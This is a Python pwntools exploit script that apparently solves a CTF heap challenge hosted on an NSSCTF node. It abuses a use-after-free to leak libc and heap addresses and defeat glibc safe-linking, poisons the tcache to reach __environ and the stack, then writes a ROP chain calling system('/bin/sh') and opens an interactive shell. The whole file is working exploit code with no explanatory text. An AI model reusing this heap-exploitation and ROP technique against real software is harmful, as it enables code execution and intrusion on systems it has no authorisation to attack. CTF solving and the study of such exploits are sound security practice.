from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.anna.nssctf.cn",28687)
# io=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc.so")

def add():
    io.sendlineafter("Choice: ","1") #0x100
    
def delete(n):
    io.sendlineafter("Choice: ","2")
    io.sendlineafter("Idx: \n",str(n))
    
def show(n):
    io.sendlineafter("Choice: ","3")
    io.sendlineafter("Idx: \n",str(n))

def edit(n,s,cc):
    io.sendlineafter("Choice: ","4")
    io.sendlineafter("Idx: \n",str(n))
    io.sendlineafter("Size: \n",str(s))
    io.sendafter("Content: \n",cc)

# gdb.attach(io)
# pause()

# edit(0,0x100,p64(count_addr))
# add() #0
# edit(0,0x100,b"\x07"*0x40)
for i in range(8):
    add()
    
add() #8

for i in range(8):
    delete(i)

show(7)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))+0x74a0-libc.sym[b"__malloc_hook"]
print("leak_addr: ",hex(leak_addr))

one_gadget=[0xda861,0xda864,0xda867]
shell=one_gadget[0]+leak_addr
pop_rdi=leak_addr+next(libc.search(asm("pop rdi;ret")))
sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh\x00"))


show(0)
key=u64(io.recv(5).ljust(8,b"\x00"))
print("key: ",hex(key))
heap_addr=key<<12
print("heap_addr: ",hex(heap_addr))


environ=leak_addr+libc.sym[b"__environ"]
print("environ: ",hex(environ))


for i in range(5):
    add() #9-13

payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #14
add() #15
show(15)
stack_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x168
print("stack_addr: ",hex(stack_addr))

delete(9)
delete(10)

payload=p64(stack_addr^key)+p64(0)
edit(10,len(payload),payload)

add() #16
add() #17

payload=p64(0)*3+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
edit(17,0x30,payload)


io.interactive()